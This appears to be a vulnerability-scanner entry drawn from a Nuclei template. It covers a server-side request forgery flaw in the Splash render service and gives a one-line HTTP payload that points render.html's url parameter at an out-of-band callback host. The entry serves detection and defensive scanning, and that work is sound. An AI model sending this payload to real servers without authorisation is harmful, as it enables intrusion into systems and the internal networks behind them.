# Nuclei Template: Splash Render - SSRF
**Template ID:** splash-render-ssrf
**Vulnerability Class:** Resource Injection
**Severity:** High
**CWE:** CWE-99
**Source:** Nuclei Template (`splash-render-ssrf.yaml`)

## Vulnerability Information & PoC

## Description
Splash Render is vulnerable to Server-Side Request Forgery (SSRF) Vulnerability.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/render.html?url=https://oast.live
```

## References
- https://github.com/scrapinghub/splash
- https://b1ngz.github.io/splash-ssrf-to-get-server-root-privilege/
